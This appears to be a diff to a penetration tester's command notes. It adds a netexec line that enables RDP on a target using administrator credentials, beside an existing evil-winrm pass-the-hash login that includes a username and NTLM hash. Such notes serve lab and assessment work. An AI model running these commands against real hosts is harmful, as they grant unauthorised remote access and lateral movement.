@@ -1,3 +1,6 @@
+#net exec open rdp
+	netexec smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable
+
 # Evil RM
 	evil-winrm -i 192.168.98.120 -u corpmngr -H 4cb3933610b827a281ec479031128cc6
 
